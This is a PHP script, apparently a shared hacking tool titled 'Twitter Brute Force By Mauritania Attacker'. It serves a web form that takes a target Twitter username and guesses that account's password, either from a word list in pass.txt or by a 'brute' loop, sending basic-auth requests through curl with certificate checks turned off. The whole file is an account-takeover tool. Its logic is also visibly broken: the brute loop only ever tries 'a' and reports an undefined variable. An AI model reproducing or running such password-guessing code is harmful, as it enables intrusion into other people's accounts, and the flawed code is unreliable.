<?php
/////////////////////////////////////////////////////
////Twitter Brute Force By Mauritania Attacker//////
///////////////////////////////////////////////////

///////////////////////////////////////////////////
////Changing Description won't make you the Coder/ 
/////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////
# This script was created to Brute Force Twitter Logins,#
#it Uses CURL and 2 Methods of Login attacks (Brute Force and Dictionary) #
///////////////////////////////////////////////////////////////////////////

$dic ="pass.txt";
//////////////////////////////////////////////////////////////////////////



echo "
<title>Twitter Brute Force By Mauritania Attacker</title>
</head>
<style type='text/css'>
body {


font:Verdana, Arial, Helvetica, sans-serif;
font-size:12px;
border-color:#FFFFFF;
}
.raster_table {
background-color:BLUE;
border-color:#CCCCCC;
}
.alert {
    color:#FF0000;
}
</style>
<body>
<table cellpadding='0' cellspacing='0' align='center' class='raster_table' width='75%'>
<tr>
<td>
<div align='center'><b>Twitter Brute Force [PHP] By Mauritania Attacker</b></div>
        </td>
    </tr>
</table>
<table cellpadding='0' cellspacing='0' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'>

            </div>
        </td>
    </tr>
    <tr>
        <td>
            <div align='center'>
             
            </div>
        </td>
    </tr>
    <tr>
        <td>
            <div align='center'>
                <form method='post'>
                    Target User:<br>
                    <input name='username' type='text' /><br><br>
                    <input name='attack' type='submit' value='dictionary' /> - <input name='attack' type='submit' value='brute' /><br>
                </form>
            </div>
        </td>
    </tr>
    <tr>
        <td>
            <div align='center'>
             
            </div>
        </td>
    </tr>
</table>
";
// Sets variables and retrives twitter error for comparing
if(isset($_POST['attack']) && isset($_POST['username'])) {
    $username = $_POST['username'];
    $headers = array(
    "Host: stream.twitter.com",
    "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:23.0) Gecko/20100101 Firefox/23.0",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3",
    "Accept-Encoding: text", # No gzip, it only clutters your code!
    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
    "Date: ".date(DATE_RFC822)
    );
    $c = curl_init('https://stream.twitter.com/1/statuses/filter.json');
    curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
    curl_setopt($c, CURLOPT_HTTPHEADER, $headers); // send the headers
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 1);
    curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
    $wrong = curl_exec($c); // Get it
    curl_close($c); // Close the curl stream
}
//Dictionary Attack
if($_POST['attack'] == "dictionary") {
    $Dictionary = file("$dic");
    for ($Position = 0; $Position < count($Dictionary); $Position++) {
        $Dictionary[$Position] = str_replace("rn", "", $Dictionary[$Position]);
        if(check_correct($username, $Dictionary[$Position])) {
            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'><b>Found the password of: ".$Dictionary[$Position]."<br> For the account: ".$username."</b></div>
        </td>
    </tr>
</table>
</body>
</html>");
        }
    }
    echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'><b>Sorry... a password was not found for the account of <span class='alert'>".$username."</span> during the dictionar
y attack.</b></div>
        </td>
    </tr>
</table>";
}
//Brute Attack
elseif($_POST['attack'] == "brute") {
    for ($Pass = 0; $Pass < 2; $Pass++) {
        if ($Pass == 0){$Pass = "a";} elseif ($Pass == 1){ $Pass = "a"; }
        if(check_correct($username, $Pass)) {
            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'><b>Found the password of: ".$Dictionary[$Position]."<br> For the account: ".$username."</b></div>
        </td>
    </tr>
</table>
</body>
</html>");
        }
    }
    echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'><b>Sorry... a password was not found for the account of <span class='alert'>".$username."</span> during the brute for
ce attack.</b></div>
        </td>
    </tr>
</table>";
}
echo "</body>
</html>";
// Function for checking whether the username and password are correct
function check_correct($username, $password)
{
        global $wrong, $headers;
        $c = curl_init('https://'.$username.':'.$password.'@stream.twitter.com/1/statuses/filter.json');
        curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
        curl_setopt($c, CURLOPT_HTTPHEADER, $headers); // send the headers
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 1);
        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
        $str = curl_exec($c); // Get it
        curl_close($c);
        if($str != $wrong) {return true;}
        else {return false;}
}

?>